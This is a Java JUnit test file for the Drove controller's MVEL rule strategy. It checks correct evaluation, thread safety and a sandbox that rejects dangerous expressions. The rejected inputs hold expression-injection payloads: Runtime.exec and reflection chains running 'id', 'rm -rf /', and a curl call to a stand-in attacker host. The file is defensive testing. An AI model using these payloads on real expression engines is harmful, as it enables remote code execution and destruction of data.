/*
 *  Copyright (c) 2025 Original Author(s), PhonePe India Pvt. Ltd.
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *  http://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */

package com.phonepe.drove.controller.rule.mvel;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import java.util.stream.Stream;

import com.phonepe.drove.controller.ControllerTestUtils;
import com.phonepe.drove.controller.rule.TestDataNode;
import com.phonepe.drove.models.info.nodedata.ExecutorState;
import com.phonepe.drove.models.info.nodedata.NodeTransportType;
import com.phonepe.drove.models.info.resources.NodeSelectionContext;
import com.phonepe.drove.models.info.resources.allocation.AllocatedExecutorNode;
import com.phonepe.drove.models.info.resources.allocation.CPUAllocation;
import com.phonepe.drove.models.info.resources.allocation.GPUAllocation;
import com.phonepe.drove.models.info.resources.allocation.MemoryAllocation;
import com.phonepe.drove.models.operation.rule.RuleCallStatus;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.Arguments;
import org.junit.jupiter.params.provider.MethodSource;

import lombok.val;

class MvelRuleStrategyTest {

    @Test
    void test() {
        val rs = MvelRuleInstance.create(0);

        assertTrue(rs.evaluate("data == 'SS'", new TestDataNode("SS")).isResult());
        assertFalse(rs.evaluate("data == 'XX'", new TestDataNode("SS")).isResult());
        assertFalse(rs.evaluate("data == 'SS'", new TestDataNode(null)).isResult());
        assertEquals(RuleCallStatus.FAILURE, rs.evaluate("'ab cd", new TestDataNode("SS")).getStatus());

        //Regex
        assertTrue(rs.evaluate("data ~= '^s.*'", new TestDataNode("ss")).isResult());
        assertFalse(rs.evaluate("data ~= '^s.*'", new TestDataNode("xx")).isResult());
    }

    /**
     * Regression test for the staging stall (MVEL concurrency bugs).
     *
     * <p>Simulates the 4-application / multi-thread scenario:
     * 32 threads each compile and evaluate the same set of rules simultaneously.
     */
    @Test
    void concurrentEvaluationIsThreadSafeAndCorrect() throws InterruptedException, ExecutionException {
        val strategy = new MvelRuleStrategy(50, new SafeMvel(List.of()));

        val matchingExecutorId = "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee";
        val matchingHostname   = "executor-01.example.internal";
        val nonMatchingId      = "11111111-2222-3333-4444-555555555555";
        val nonMatchingHost    = "executor-99.example.internal";

        val rules = List.of(
                "allocation.node.executorId=='" + matchingExecutorId + "'",
                "allocation.node.hostname=='" + matchingHostname + "'",
                "allocation.node.executorId==\"" + matchingExecutorId + "\""
        );

        val matchingContext    = nodeSelectionContext(matchingExecutorId, matchingHostname);
        val nonMatchingContext = nodeSelectionContext(nonMatchingId, nonMatchingHost);

        val threadCount = 32;
        ExecutorService pool = Executors.newFixedThreadPool(threadCount);

        List<Callable<Void>> tasks = new ArrayList<>();
        for (int t = 0; t < threadCount; t++) {
            tasks.add(() -> {
                for (val rule : rules) {
                    val matchResult = strategy.evaluate(rule, matchingContext);
                    assertEquals(RuleCallStatus.SUCCESS, matchResult.getStatus(),
                                 "Rule evaluation must succeed: " + rule);

                    val noMatchResult = strategy.evaluate(rule, nonMatchingContext);
                    assertEquals(RuleCallStatus.SUCCESS, noMatchResult.getStatus(),
                                 "Rule evaluation must succeed for non-matching node: " + rule);
                }
                return null;
            });
        }

        List<Future<Void>> futures = pool.invokeAll(tasks, 10, TimeUnit.SECONDS);
        pool.shutdown();

        for (val f : futures) {
            f.get();
        }
    }

    
    @ParameterizedTest(name = "[{0}] {1}")
    @MethodSource("ruleExpressions")
    void ruleCompilationReturnsExpectedStatus(RuleCallStatus expectedStatus, String expression) {
        val strategy = new MvelRuleStrategy(50, new SafeMvel(List.of()));
        val result = strategy.check(expression);
        assertEquals(expectedStatus, result.getStatus(),
                     "Unexpected status for expression: " + expression);
    }

    static Stream<Arguments> ruleExpressions() {
        return Stream.of(
                Arguments.of(RuleCallStatus.SUCCESS, "new ArrayList()"),
                Arguments.of(RuleCallStatus.SUCCESS, "1 == 1"),
                Arguments.of(RuleCallStatus.SUCCESS, "status == 'System Restart'"),
                Arguments.of(RuleCallStatus.SUCCESS, "msg == 'Runtime error occurred'"),
                Arguments.of(RuleCallStatus.SUCCESS, "label == \"Process Complete\""),
                Arguments.of(RuleCallStatus.SUCCESS, "name == 'Thread Pool Manager'"),
                Arguments.of(RuleCallStatus.SUCCESS, "desc == 'Class A student'"),
                Arguments.of(RuleCallStatus.SUCCESS, "x == 'call getClass for info'"),
                Arguments.of(RuleCallStatus.SUCCESS, "allocation.node.executorId=='executor-01.example.internal'"),
                Arguments.of(RuleCallStatus.SUCCESS, "allocation.node.hostname=='node1'"),
                Arguments.of(RuleCallStatus.FAILURE, "aa bb"),
                Arguments.of(RuleCallStatus.FAILURE, "Runtime.getRuntime().exec('touch /tmp/test')"),
                Arguments.of(RuleCallStatus.FAILURE, "new ProcessBuilder('rm', '-rf', '/').start()"),
                Arguments.of(RuleCallStatus.FAILURE, "Runtime.getRuntime()"),
                Arguments.of(RuleCallStatus.FAILURE, "Class.forName('java.lang.Runtime').getMethod('exec', String.class)"),
                Arguments.of(RuleCallStatus.FAILURE, "System.setProperty('java.io.tmpdir', '/tmp')"),
                Arguments.of(RuleCallStatus.FAILURE, "Runtime.getRuntime().exec(new String[]{'/bin/sh','-c','id'})"),
                Arguments.of(RuleCallStatus.FAILURE, "((Runtime)Runtime.class.getMethod('getRuntime',null).invoke(null,null)).exec('id')"),
                Arguments.of(RuleCallStatus.FAILURE, "Class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('touch /tmp/pwned')"),
                Arguments.of(RuleCallStatus.FAILURE, "new Object[]{}.getClass().forName('java.lang.Runtime').getRuntime().exec('id')"),
                Arguments.of(RuleCallStatus.FAILURE, "'hello'.getClass().forName('java.lang.Runtime')"),
                Arguments.of(RuleCallStatus.FAILURE, "''.getClass().forName('java.lang.ProcessBuilder')"),
                Arguments.of(RuleCallStatus.FAILURE, "'x'.class.forName('java.lang.Runtime')"),
                Arguments.of(RuleCallStatus.FAILURE, "1.getClass().forName('java.lang.Runtime')"),
                Arguments.of(RuleCallStatus.FAILURE, "'a'.getClass().getMethod('exec')"),
                Arguments.of(RuleCallStatus.FAILURE, "'a'.getClass().getDeclaredMethod('exec')"),
                Arguments.of(RuleCallStatus.FAILURE, "'a'.getClass().getConstructor()"),
                Arguments.of(RuleCallStatus.FAILURE, "'a'.getClass().getDeclaredConstructor()"),
                Arguments.of(RuleCallStatus.FAILURE, "'a'.getClass().newInstance()"),
                Arguments.of(RuleCallStatus.FAILURE, "'a'.getClass().getField('value')"),
                Arguments.of(RuleCallStatus.FAILURE, "'a'.getClass().getDeclaredField('value')"),
                Arguments.of(RuleCallStatus.FAILURE, "org.mvel2.MVEL.eval('Runtime.getRuntime().exec(\\\"curl http://attacker.example.com/test\\\")');true"),

                // ---- Thread/System etc ----
                Arguments.of(RuleCallStatus.FAILURE, "Thread.currentThread()"),
                Arguments.of(RuleCallStatus.FAILURE, "System.exit(0)"),
                Arguments.of(RuleCallStatus.FAILURE, "System.getenv('PATH')"),

                // --- Regex cases --
                Arguments.of(RuleCallStatus.SUCCESS, "data ~= '.*ss.*'"),
                Arguments.of(RuleCallStatus.SUCCESS, "data ~= '^s[a-z]+'"),
                Arguments.of(RuleCallStatus.SUCCESS, "data.matches('s.*')"),
                Arguments.of(RuleCallStatus.SUCCESS, "Pattern.compile('^s.*').matcher(data).matches()")
        );
    }

    private static NodeSelectionContext nodeSelectionContext(String executorId, String hostname) {
        val node = new AllocatedExecutorNode(
                executorId,
                hostname,
                7000,
                NodeTransportType.HTTP,
                new CPUAllocation(Collections.singletonMap(0, Collections.singleton(2))),
                new MemoryAllocation(Collections.singletonMap(0, 512L)),
                new GPUAllocation(Set.of(), null),
                Set.of(),
                Map.of(),
                ExecutorState.ACTIVE);
        return NodeSelectionContext.builder()
                .session(NodeSelectionContext.SchedulingSession.builder()
                                 .sessionId("test-session")
                                 .build())
                .environment(NodeSelectionContext.SchedulingEnvironment.builder()
                                     .liveExecutors(Map.of())
                                     .variables(Map.of())
                                     .build())
                .allocation(NodeSelectionContext.NodeAllocation.builder()
                                    .spec(ControllerTestUtils.appSpec())
                                    .instanceId("test-instance")
                                    .node(node)
                                    .build())
                .build();
    }

}
